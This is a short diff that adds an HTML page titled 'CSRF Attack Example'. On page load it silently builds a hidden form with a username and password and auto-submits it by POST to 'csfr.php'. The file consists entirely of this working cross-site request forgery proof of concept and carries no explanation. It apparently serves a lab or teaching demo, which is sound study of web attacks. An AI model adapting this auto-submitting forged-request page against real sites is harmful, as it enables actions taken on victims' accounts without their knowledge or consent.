@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack Example</title>
+</head>
+<body>
+
+<script>
+document.addEventListener('DOMContentLoaded', function() {
+    var form = document.createElement('form');
+    form.method = 'post';
+    form.action = 'csfr.php';
+    var usernameField = document.createElement('input');
+    usernameField.type = 'hidden';
+    usernameField.name = 'username';
+    usernameField.value = 'host';
+    var passwordField = document.createElement('input');
+    passwordField.type = 'hidden';
+    passwordField.name = 'password';
+    passwordField.value = 'pass';
+    form.appendChild(usernameField);
+    form.appendChild(passwordField);
+    document.body.appendChild(form);
+    form.submit();
+});
+</script>
+
+</body>
+</html>
